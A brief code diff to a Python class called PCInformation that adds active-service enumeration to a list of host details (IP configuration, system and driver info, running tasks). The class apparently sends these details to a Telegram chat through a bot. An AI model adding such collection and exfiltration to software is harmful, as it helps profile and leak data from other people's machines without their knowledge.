@@ -517,7 +517,8 @@ class PCInformation:
                 self.__ip_config(),
                 self.__system_info(),
                 self.__driver_info(),
-                self.__taks_list()]
+                self.__taks_list(),
+                self.__service_active()]
         for i in send:
             try:
                 bot.sendChatAction(chat_id, 'typing')
